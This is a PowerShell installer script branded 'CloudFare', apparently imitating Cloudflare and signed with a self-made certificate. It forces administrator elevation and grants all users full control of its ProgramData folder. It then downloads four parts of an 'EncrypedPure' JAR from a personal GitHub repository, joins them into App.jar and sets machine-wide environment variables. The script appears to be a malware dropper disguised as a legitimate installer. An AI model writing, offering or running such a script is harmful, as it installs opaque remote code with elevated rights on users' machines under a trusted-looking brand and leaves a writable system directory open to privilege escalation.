# CloudFare Installation Universal v2.0 - Enhanced Compatibility
# Multi-Path Architecture with Fallback Support
# Compatible: Windows 7 SP1 to Windows 11+, All Architectures
# Features: Admin/User modes, Auto-elevation, Offline support, Multi-source downloads

param(
    [string]$InstallDir = "C:\ProgramData\CloudFare",
    [string]$JavaVersion = "21",
    [string]$CachePath = "",
    [switch]$Offline = $false,
    [switch]$SkipJava = $false,
    [switch]$Portable = $false,
    [string]$Target = "",
    [switch]$ForceAdmin = $false
)

$ErrorActionPreference = "Continue"
$script:ErrorCount = 0
$script:WarningCount = 0
$script:JavaSources = @()
$script:DownloadFailed = $false

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

function Write-Log {
    param([string]$Message, [string]$Type = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $color = @{
        "INFO" = "Cyan"
        "OK" = "Green"
        "WARN" = "Yellow"
        "ERROR" = "Red"
        "DEBUG" = "Gray"
    }
    Write-Host "[$timestamp] [$Type] $Message" -F $color[$Type]
    
    if ($Type -eq "ERROR") { $script:ErrorCount++ }
    if ($Type -eq "WARN") { $script:WarningCount++ }
}

function Test-AdminPrivileges {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Request-AdminPrivileges {
    Write-Log "Admin privileges required - requesting elevation..." "WARN"
    
    $scriptPath = $MyInvocation.ScriptName
    $args = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    
    # Add parameters to re-invocation
    if ($InstallDir) { $args += " -InstallDir `"$InstallDir`"" }
    if ($JavaVersion) { $args += " -JavaVersion $JavaVersion" }
    if ($CachePath) { $args += " -CachePath `"$CachePath`"" }
    if ($Offline) { $args += " -Offline" }
    if ($SkipJava) { $args += " -SkipJava" }
    
    Start-Process powershell -ArgumentList $args -Verb RunAs -Wait
    exit $LASTEXITCODE
}

function Get-OSVersion {
    $os = Get-CimInstance -ClassName Win32_OperatingSystem
    return @{
        Name = $os.Caption
        Version = $os.Version
        Build = $os.BuildNumber
        Is64Bit = [Environment]::Is64BitOperatingSystem
        IsLegacy = [System.Version]$os.Version -lt [System.Version]"10.0"
    }
}

function Get-OSArchitecture {
    if ([Environment]::Is64BitOperatingSystem) {
        return "x64"
    } else {
        return "x86"
    }
}

function Initialize-JavaSources {
    <#
    Build fallback chain for Java downloads
    Priority order: Cache → GitHub → Adoptium → Microsoft → Oracle → Azul
    #>
    
    $sources = @()
    
    # Priority 1: Local Cache
    if ($CachePath -and (Test-Path $CachePath)) {
        $cachedJava = Get-ChildItem "$CachePath" -Filter "*java*" -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($cachedJava) {
            $sources += @{ Name = "LocalCache"; Path = $cachedJava.FullName; Type = "Local" }
            Write-Log "Local Java cache found: $($cachedJava.Name)" "OK"
        }
    }
    
    # Priority 2: GitHub CloudFare Repository
    $sources += @{
        Name = "GitHub-CloudFare"
        URL = "https://raw.githubusercontent.com/davidrenand/repos/main/java/java-$JavaVersion-windows.zip"
        Type = "Remote"
    }
    
    # Priority 3: GraalVM Official Releases
    $sources += @{
        Name = "GraalVM-Official"
        URL = "https://github.com/graalvm/graalvm-ce-builds/releases/latest"
        Type = "Remote"
        Pattern = "*windows-amd64*.zip"
    }
    
    # Priority 4: Adoptium (Eclipse OpenJDK)
    $sources += @{
        Name = "Adoptium"
        URL = "https://api.adoptium.net/v3/assets/latest/$JavaVersion/hotspot?os=windows&arch=x64"
        Type = "Remote-API"
    }
    
    # Priority 5: Microsoft OpenJDK
    $sources += @{
        Name = "Microsoft-OpenJDK"
        URL = "https://github.com/microsoft/openjdk/releases/latest"
        Type = "Remote"
        Pattern = "*windows-x64*.zip"
    }
    
    # Priority 6: Oracle JDK
    $sources += @{
        Name = "Oracle-JDK"
        URL = "https://download.oracle.com/java/$JavaVersion/latest/jdk-${JavaVersion}_windows-x64_bin.zip"
        Type = "Remote"
    }
    
    # Priority 7: Azul Zulu
    $sources += @{
        Name = "Azul-Zulu"
        URL = "https://www.azul.com/downloads/zulu-community/"
        Type = "Remote"
    }
    
    return $sources
}

function Test-JavaSource {
    param([hashtable]$Source)
    
    if ($Source.Type -eq "Local") {
        return Test-Path $Source.Path
    }
    
    try {
        $request = [System.Net.HttpWebRequest]::Create($Source.URL)
        $request.Method = "HEAD"
        $request.Timeout = 3000
        $response = $request.GetResponse()
        $success = $response.StatusCode -eq 200
        $response.Close()
        return $success
    } catch {
        return $false
    }
}

function Download-JavaWithFallback {
    param([string]$TargetPath)
    
    Write-Log "Initializing Java download with multi-source fallback..." "INFO"
    $javaSources = Initialize-JavaSources
    
    foreach ($source in $javaSources) {
        Write-Log "Trying source: $($source.Name)" "INFO"
        
        if (Test-JavaSource $source) {
            if ($source.Type -eq "Local") {
                Write-Log "Using cached Java: $($source.Path)" "OK"
                Copy-Item $source.Path $TargetPath -Force
                return $true
            } else {
                try {
                    Write-Log "Downloading from $($source.Name)..." "INFO"
                    Invoke-WebRequest -Uri $source.URL -OutFile $TargetPath -ErrorAction Stop
                    Write-Log "Successfully downloaded Java from $($source.Name)" "OK"
                    return $true
                } catch {
                    Write-Log "Download from $($source.Name) failed: $_" "WARN"
                }
            }
        } else {
            Write-Log "Source $($source.Name) unavailable" "WARN"
        }
    }
    
    Write-Log "All Java sources exhausted" "ERROR"
    return $false
}

function Check-SystemJava {
    <#
    Check if Java is already installed on system
    #>
    
    try {
        $javaCmd = Get-Command java -ErrorAction Stop
        $version = & $javaCmd -version 2>&1
        
        Write-Log "System Java found: $javaCmd" "OK"
        Write-Log "Version info: $version" "DEBUG"
        
        return @{
            Found = $true
            Path = $javaCmd.Source
            Version = $version
        }
    } catch {
        return @{ Found = $false }
    }
}

function Create-InstallationDirectory {
    param([string]$Path)
    
    Write-Log "Creating installation directory: $Path" "INFO"
    
    try {
        # Create directory
        if (!(Test-Path $Path)) {
            New-Item -Path $Path -ItemType Directory -Force | Out-Null
            Write-Log "Directory created successfully" "OK"
        } else {
            Write-Log "Directory already exists" "DEBUG"
        }
        
        # Create subdirectories
        @("Java", "Logs", "Cache", "Config") | ForEach-Object {
            $subDir = Join-Path $Path $_
            if (!(Test-Path $subDir)) {
                New-Item -Path $subDir -ItemType Directory -Force | Out-Null
            }
        }
        
        # Configure ACLs for shared access
        $acl = Get-Acl $Path
        $rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
            "BUILTIN\Users",
            "FullControl",
            "ContainerInherit,ObjectInherit",
            "None",
            "Allow"
        )
        $acl.AddAccessRule($rule)
        Set-Acl -Path $Path -AclObject $acl
        
        Write-Log "ACLs configured for shared access" "OK"
        return $true
    } catch {
        Write-Log "Failed to create directory: $_" "ERROR"
        return $false
    }
}

function Download-JARParts {
    param([string]$TargetDir)
    
    Write-Log "Downloading JAR parts..." "INFO"
    
    # Import retry download function
    Import-Module (Join-Path $PSScriptRoot "Download-WithRetry.ps1") -Force
    
    $parts = 1..4 | ForEach-Object {
        @{
            URL = "https://raw.githubusercontent.com/davidrenand/repos/main/jar/EncrypedPure.part$_.jar"
            FileName = "EncrypedPure.part$_.jar"
        }
    }
    
    $downloaded = 0
    foreach ($part in $parts) {
        $targetFile = Join-Path $TargetDir $part.FileName
        
        $result = Invoke-FileDownloadWithRetry -Url $part.URL -DestinationPath $targetFile
        
        if ($result) {
            $downloaded++
            $fileSize = (Get-Item $targetFile).Length / 1MB
            Write-Log "Downloaded $($part.FileName) ($($fileSize.ToString('F2')) MB)" "OK"
        } else {
            Write-Log "Failed to download $($part.FileName)" "ERROR"
        }
    }
    
    return $downloaded -eq 4
}

function Assemble-JAR {
    param(
        [string]$SourceDir,
        [string]$OutputPath
    )
    
    Write-Log "Assembling JAR from parts..." "INFO"
    
    try {
        $parts = @("EncrypedPure.part1.jar", "EncrypedPure.part2.jar", 
                   "EncrypedPure.part3.jar", "EncrypedPure.part4.jar")
        
        $outputStream = [System.IO.File]::Create($OutputPath)
        
        foreach ($part in $parts) {
            $partPath = Join-Path $SourceDir $part
            if (Test-Path $partPath) {
                $bytes = [System.IO.File]::ReadAllBytes($partPath)
                $outputStream.Write($bytes, 0, $bytes.Length)
                Write-Log "Added $part" "DEBUG"
            } else {
                Write-Log "Missing part: $part" "WARN"
            }
        }
        
        $outputStream.Close()
        $fileSize = (Get-Item $OutputPath).Length / 1MB
        Write-Log "JAR assembled successfully (${fileSize}MB)" "OK"
        return $true
    } catch {
        Write-Log "Failed to assemble JAR: $_" "ERROR"
        return $false
    }
}

function Set-EnvironmentVariables {
    param(
        [string]$JavaPath,
        [string]$AppPath
    )
    
    Write-Log "Configuring environment variables..." "INFO"
    
    try {
        # Set JAVA_HOME
        [Environment]::SetEnvironmentVariable(
            "JAVA_HOME",
            $JavaPath,
            "Machine"
        )
        Write-Log "JAVA_HOME set to: $JavaPath" "OK"
        
        # Update PATH
        $currentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
        if ($currentPath -notlike "*$JavaPath\bin*") {
            $newPath = "$currentPath;$JavaPath\bin"
            [Environment]::SetEnvironmentVariable(
                "PATH",
                $newPath,
                "Machine"
            )
            Write-Log "PATH updated with Java bin directory" "OK"
        }
        
        # Set CLOUDFAREJAR_HOME
        [Environment]::SetEnvironmentVariable(
            "CLOUDFAREJAR_HOME",
            $AppPath,
            "Machine"
        )
        Write-Log "CLOUDFAREJAR_HOME set to: $AppPath" "OK"
        
        return $true
    } catch {
        Write-Log "Failed to set environment variables: $_" "ERROR"
        return $false
    }
}

function Verify-Installation {
    param([string]$InstallDir)
    
    Write-Log "Verifying installation..." "INFO"
    
    $checks = @(
        @{ Name = "Installation Directory"; Path = $InstallDir }
        @{ Name = "Java Directory"; Path = "$InstallDir\Java" }
        @{ Name = "App JAR"; Path = "$InstallDir\App.jar" }
        @{ Name = "Logs Directory"; Path = "$InstallDir\Logs" }
    )
    
    $passed = 0
    foreach ($check in $checks) {
        if (Test-Path $check.Path) {
            Write-Log "$($check.Name) exists" "OK"
            $passed++
        } else {
            Write-Log "$($check.Name) missing" "ERROR"
        }
    }
    
    return $passed -eq $checks.Count
}

# ============================================================================
# MAIN INSTALLATION LOGIC
# ============================================================================

Write-Log "CloudFare Installation Universal v2.0 Starting..." "INFO"
Write-Log "OS: $(Get-OSVersion | ConvertTo-Json -Compress)" "DEBUG"

# Step 1: Privilege Check
if (!(Test-AdminPrivileges)) {
    Write-Log "Running in user context - requesting elevation" "WARN"
    Request-AdminPrivileges
}

Write-Log "Running with admin privileges" "OK"

# Step 2: Create Installation Directory
if (!(Create-InstallationDirectory $InstallDir)) {
    Write-Log "Installation failed: Cannot create directory" "ERROR"
    exit 1
}

# Step 3: Handle Java Installation
if (!$SkipJava) {
    $systemJava = Check-SystemJava
    if (!$systemJava.Found) {
        Write-Log "No system Java found - attempting download" "INFO"
        
        if (Download-JavaWithFallback "$InstallDir\java.zip") {
            Write-Log "Extracting Java..." "INFO"
            Expand-Archive -Path "$InstallDir\java.zip" -DestinationPath "$InstallDir\Java" -Force
            Remove-Item "$InstallDir\java.zip"
            Write-Log "Java installed successfully" "OK"
        } else {
            if ($Offline) {
                Write-Log "Offline mode - Java not available" "ERROR"
                exit 1
            } else {
                Write-Log "Java installation failed - proceeding with system Java" "WARN"
            }
        }
    } else {
        Write-Log "System Java available at: $($systemJava.Path)" "OK"
    }
} else {
    Write-Log "Skipping Java installation (--SkipJava flag)" "INFO"
}

# Step 4: Download and Assemble JAR
if (!(Download-JARParts $InstallDir)) {
    Write-Log "JAR parts download failed" "ERROR"
    exit 1
}

if (!(Assemble-JAR $InstallDir "$InstallDir\App.jar")) {
    Write-Log "JAR assembly failed" "ERROR"
    exit 1
}

# Step 5: Configure Environment
$javaDir = if (Test-Path "$InstallDir\Java") { "$InstallDir\Java" } else { (Get-Command java).Source | Split-Path }
if (!(Set-EnvironmentVariables $javaDir $InstallDir)) {
    Write-Log "Environment configuration failed - proceeding anyway" "WARN"
}

# Step 6: Verify Installation
if (Verify-Installation $InstallDir) {
    Write-Log "Installation verification passed" "OK"
    Write-Log "================================================" "OK"
    Write-Log "CloudFare Installation Complete!" "OK"
    Write-Log "Installation Directory: $InstallDir" "OK"
    Write-Log "================================================" "OK"
    exit 0
} else {
    Write-Log "Installation verification failed" "ERROR"
    exit 1
}

# SIG # Begin signature block
# MIIFWwYJKoZIhvcNAQcCoIIFTDCCBUgCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQU8IvuGzG1y4K6tyFwrR/mV6IQ
# PcKgggL8MIIC+DCCAeCgAwIBAgIQFEA8i6m7gZ5GA+AtSKCeIjANBgkqhkiG9w0B
# AQsFADAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwHhcNMjUxMTI3MTY0NjI1WhcNMzAx
# MTI3MTY1NjI1WjAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwggEiMA0GCSqGSIb3DQEB
# AQUAA4IBDwAwggEKAoIBAQCwcOS5Unea33JuYXDoorRS8MRt7/sCwNRSDcdRUz7N
# fb1NjESMXbkE/rLcapbH8DhYfpX59h0Cp0ROdfgcQSxitCOqn5zGIOThKOHUW18x
# wJnOBM1lRrvZfoNun1cSgYnE1BQX+2FlrCjeHRUCkYo/KuCYlHjSD7W4BWwPGXPJ
# ofCbFhX909qbXblZt6jJBoTni8MNC+Bizfv302qhVAh+0CWCCsYYhcNAWXj+qb0t
# 9EvQHGQT6c2weIanGEcIMDwjO0/sldunBEVJBhe8TXeF/3wfn1rGAzqOgvYXFvd/
# J9eeO/Oeo+BDNBRwPcVHmO02vK7RCUJqR3Ub7pBNVbBpAgMBAAGjRjBEMA4GA1Ud
# DwEB/wQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAzAdBgNVHQ4EFgQU4eXXKcu5
# 5PGlisHTXHU95ihdYyMwDQYJKoZIhvcNAQELBQADggEBAHRZGGdVylXjYignpkSf
# 5ctiETsIscLuQTJJ1URT67Y+0x7xbcD9474OCUuTIEZh9wPL2HSmoNrDY7qxMKc4
# qCwxwoWQAWmLLcxgytJ8qpi2vZaExBDgODwU3LIA3uNu3iCmHbu8ISF68T1HR2+c
# 7cn1wn/C3XZOVhOW8CVjIpltD01LujsoauH8eRg93R6q3Z5yJ+5WJDNYzl6Y2xGL
# 9UQ4Xv7y8+wXES809v5+e/2kQL/NWwd3hOB6/176mfaT15ZZHBys1pYOJBHiMO9v
# W5IImNwQ/eXXzUrppVnCQ6fLm5GyTKqGq14cMahma6K8r9lrgvkLI1VS1ue0La5l
# 5MAxggHJMIIBxQIBATAoMBQxEjAQBgNVBAMMCUNsb3VkRmFyZQIQFEA8i6m7gZ5G
# A+AtSKCeIjAJBgUrDgMCGgUAoHgwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZ
# BgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYB
# BAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQU/0GM7i8l/x5aV4NFXprNso+50LAwDQYJ
# KoZIhvcNAQEBBQAEggEAYSDCaZPtk9LU+2qMaIOkjkwfxGNhtt1IwRgPA41HyRlc
# gVQnC+ciJhqZuA4kn2olcVK5tvDJxy6HOkvLA9xarsnMzns557D8Cqg/BMDCv4Bv
# lPe1t+7z4M2igxfTzeMWxq2wTX3795xhAjo9RbxzhKHDwZ9EEyiZcTc3yNv+BZX7
# Q5A0O1hTcYRlhErjREjRVfo3SOl/dqCgMW17bk2zfiFFosachRWiN/cNHKmmYkbx
# CIGv6G6zgkCBByG1OXpDfNr/MFF1nOb9D/p2rtvtfBUI7jJ7qd10irmzjUVqbJe/
# VmUeGnKbtxbb26esFH18zfmzt2uThTjkOigzo7y+PQ==
# SIG # End signature block
